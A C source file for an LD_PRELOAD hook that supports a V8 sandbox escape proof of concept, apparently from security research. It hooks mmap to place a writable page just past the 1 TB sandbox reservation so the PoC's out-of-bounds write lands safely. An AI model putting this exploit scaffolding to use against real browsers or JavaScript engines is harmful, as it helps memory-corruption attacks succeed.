/* mmap_hook.c — LD_PRELOAD hook for V8 sandbox escape PoC
 *
 * When V8 initializes its 1 TB sandbox it calls:
 *   mmap(NULL, 0x10000000000, PROT_NONE, MAP_ANONYMOUS|MAP_PRIVATE, -1, 0)
 * This hook intercepts that call and immediately maps one additional
 * read/write page at SB_END = ret + 1 TB, so that the PoC's OOB write
 * to SB_END+4 lands on a mapped page and succeeds without crashing.
 *
 * Build:
 *   gcc -O2 -shared -fPIC -o mmap_hook.so mmap_hook.c -ldl
 * Use:
 *   LD_PRELOAD=./mmap_hook.so d8 --expose-memory-corruption-api \
 *       --allow-natives-syntax heap_escape_noargs.js
 */
#define _GNU_SOURCE
#include <dlfcn.h>
#include <sys/mman.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

#define SB_SIZE  0x10000000000ULL   /* 1 TB — V8 sandbox reservation size */

typedef void* (*mmap_t)(void*, size_t, int, int, int, off_t);
static mmap_t real_mmap;

__attribute__((constructor))
static void hook_init(void) {
    real_mmap = (mmap_t)dlsym(RTLD_NEXT, "mmap");
    if (!real_mmap) { fputs("[mmap_hook] dlsym(mmap) failed\n", stderr); exit(1); }
}

void* mmap(void* addr, size_t len, int prot, int flags, int fd, off_t off) {
    void* ret = real_mmap(addr, len, prot, flags, fd, off);

    /* Identify the sandbox reservation: 1 TB, PROT_NONE, anonymous, private */
    if (ret != MAP_FAILED
     && len  == SB_SIZE
     && prot == PROT_NONE
     && fd   == -1) {

        char* sb_end = (char*)ret + SB_SIZE;
        void* page = real_mmap(sb_end, 4096,
                               PROT_READ | PROT_WRITE,
                               MAP_ANONYMOUS | MAP_PRIVATE | MAP_FIXED,
                               -1, 0);
        if (page == MAP_FAILED)
            fprintf(stderr, "[mmap_hook] WARNING: could not map page at SB_END\n");
        else
            fprintf(stderr,
                    "[mmap_hook] sandbox @ %p+1TB  →  mapped page at SB_END=%p  ✓\n",
                    ret, page);
    }
    return ret;
}
